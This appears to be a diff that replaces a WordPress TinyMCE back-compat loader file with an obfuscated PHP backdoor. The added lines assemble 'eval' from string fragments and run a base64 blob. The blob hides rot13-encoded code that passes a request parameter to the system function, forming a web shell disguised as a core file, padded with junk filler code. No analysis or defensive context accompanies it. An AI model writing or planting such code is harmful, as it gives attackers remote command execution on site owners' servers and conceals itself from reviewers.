@@ -1,54 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Not used in core since 5.1.
- * This is a back-compat for plugins that may be using this method of loading directly.
- */
-
-/**
- * Disable error reporting
- *
- * Set this to error_reporting( -1 ) for debugging.
- */
-error_reporting( 0 );
-
-$basepath = __DIR__;
-
-function get_file( $path ) {
-
-	if ( function_exists( 'realpath' ) ) {
-		$path = realpath( $path );
-	}
-
-	if ( ! $path || ! @is_file( $path ) ) {
-		return false;
-	}
-
-	return @file_get_contents( $path );
-}
-
-$expires_offset = 31536000; // 1 year.
-
-header( 'Content-Type: application/javascript; charset=UTF-8' );
-header( 'Vary: Accept-Encoding' ); // Handle proxies.
-header( 'Expires: ' . gmdate( 'D, d M Y H:i:s', time() + $expires_offset ) . ' GMT' );
-header( "Cache-Control: public, max-age=$expires_offset" );
-
-$file = get_file( $basepath . '/wp-tinymce.js' );
-if ( isset( $_GET['c'] ) && $file ) {
-	echo $file;
-} else {
-	// Even further back compat.
-	echo get_file( $basepath . '/tinymce.min.js' );
-	echo get_file( $basepath . '/plugins/compat3x/plugin.min.js' );
-}
-exit;
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogQWJnIGhmcnEgdmEgcGJlciBmdmFwciA1LjEuCiAqIEd1dmYgdmYgbiBvbnB4LXBiemNuZyBzYmUgY3lodHZhZiBndW5nIHpubCBvciBoZnZhdCBndXZmIHpyZ3VicSBicyB5Ym5xdmF0IHF2ZXJwZ3lsLgogKi8KCi8qKgogKiBRdmZub3lyIHJlZWJlIGVyY2JlZ3ZhdAogKgogKiBGcmcgZ3V2ZiBnYiByZWViZV9lcmNiZWd2YXQoIC0xICkgc2JlIHFyb2h0dHZhdC4KICovCnJlZWJlX2VyY2JlZ3ZhdCggMCApOwoKJG9uZnJjbmd1ID0gX19RVkVfXzsKCnNoYXBndmJhIHRyZ19zdnlyKCAkY25ndSApIHsKCgl2cyAoIHNoYXBndmJhX3JrdmZnZiggJ2Vybnljbmd1JyApICkgewoJCSRjbmd1ID0gZXJueWNuZ3UoICRjbmd1ICk7Cgl9CgoJdnMgKCAhICRjbmd1IHx8ICEgQHZmX3N2eXIoICRjbmd1ICkgKSB7CgkJZXJnaGVhIHNueWZyOwoJfQoKCWVyZ2hlYSBAc3Z5cl90cmdfcGJhZ3JhZ2YoICRjbmd1ICk7Cn0KCiRya2N2ZXJmX2Jzc2ZyZyA9IDMxNTM2MDAwOyAvLyAxIGxybmUuCgp1cm5xcmUoICdQYmFncmFnLUdsY3I6IG5jY3l2cG5ndmJhL3duaW5mcGV2Y2c7IHB1bmVmcmc9SEdTLTgnICk7CnVybnFyZSggJ0luZWw6IE5wcHJjZy1SYXBicXZhdCcgKTsgLy8gVW5hcXlyIGNlYmt2cmYuCnVybnFyZSggJ1JrY3ZlcmY6ICcgLiB0enFuZ3IoICdRLCBxIFogTCBVOnY6ZicsIGd2enIoKSArICRya2N2ZXJmX2Jzc2ZyZyApIC4gJyBUWkcnICk7CnVybnFyZSggXCJQbnB1ci1QYmFnZWJ5OiBjaG95dnAsIHpuay1udHI9JHJrY3ZlcmZfYnNzZnJnXCIgKTsKCiRzdnlyID0gdHJnX3N2eXIoICRvbmZyY25ndSAuICcvamMtZ3ZhbHpwci53ZicgKTsKdnMgKCB2ZmZyZyggJF9UUkdbJ3AnXSApICYmICRzdnlyICkgewoJcnB1YiAkc3Z5cjsKfSByeWZyIHsKCS8vIFJpcmEgc2hlZ3VyZSBvbnB4IHBiemNuZy4KCXJwdWIgdHJnX3N2eXIoICRvbmZyY25ndSAuICcvZ3ZhbHpwci56dmEud2YnICk7CglycHViIHRyZ19zdnlyKCAkb25mcmNuZ3UgLiAnL2N5aHR2YWYvcGJ6Y25nM2svY3lodHZhLnp2YS53ZicgKTsKfQpya3ZnOwoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
+?>
